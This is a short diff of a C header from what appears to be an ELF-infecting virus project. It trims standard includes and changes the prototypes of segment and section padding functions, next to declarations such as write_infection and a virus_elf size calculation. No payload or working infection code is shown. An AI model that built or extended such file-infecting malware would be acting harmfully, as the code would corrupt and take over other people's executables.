@@ -5,16 +5,8 @@
 
 /* TODO: Remove useless h files */
 
-# include <dirent.h>
-# include <errno.h>
 # include <fcntl.h>
-# include <libgen.h>
-# include <stdio.h>
-# include <stdlib.h>
-# include <string.h>
 # include <sys/mman.h>
-# include <sys/stat.h>
-# include <unistd.h>
 
 # include "debug.h"
 # include "elf_format.h"
@@ -48,8 +40,9 @@ int		write_infection(char *file, char *buffer, int size);
 int		get_size_needed(t_elf *elf, t_elf *virus_elf);
 
 /* padding.c */
-void	*add_padding_segments(t_elf *elf, void *src, void **dst, int nb_zero);
-void	*add_padding_sections(t_elf *elf, void *src, void **dst, int nb_zero);
+void	*update_segment_sz(void *src, void **dst, Elf64_Phdr *segment);
+void	*add_padding_segments(t_elf *elf, void *src, void **dst);
+void	*add_padding_sections(t_elf *elf, void *src, void **dst);
 
 /* main.c */
 int		_start(void);
